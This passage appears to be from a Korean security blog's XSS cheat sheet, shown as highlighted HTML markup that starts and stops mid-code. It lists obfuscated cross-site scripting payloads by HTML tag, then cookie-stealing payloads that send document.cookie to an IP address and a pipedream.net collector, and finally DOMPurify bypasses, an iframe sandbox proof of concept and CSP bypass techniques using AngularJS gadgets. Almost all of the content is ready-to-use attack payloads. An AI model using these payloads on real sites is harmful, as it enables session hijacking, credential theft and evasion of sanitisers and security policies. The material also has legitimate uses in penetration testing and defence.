class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span class="name">scrit</span>&gt;</span>void&#x27;&#x27;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">Constructor</span><br><span class="line">&#123;&#123;+constructor.constructor(&quot;alert(document.cookie)&quot;)()+&#125;&#125;</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;]]<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Iframe-Sandbox-Bypass"><a href="#Iframe-Sandbox-Bypass" class="headerlink" title=" Iframe Sandbox Bypass"></a><span style="color:#21C587"></span> Iframe Sandbox Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iframe sandbox bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;xss payoad&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;exploit()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;pocas&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://domain/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span><strong> Use an accepted domain</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure><p><strong>위와 같이 나 자신과 특정(<a href="http://141.164.52.207/">http://141.164.52.207</a>) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> Header Injection</strong><br></p><p><strong>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> AngularJS xss</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>만약 위와 같이 <code>cdnjs.cloudflare.com</code>와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</strong><br></p><p><span style="color:#21C587">&#35;</span><strong> CSP Option ↔ Bypass</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 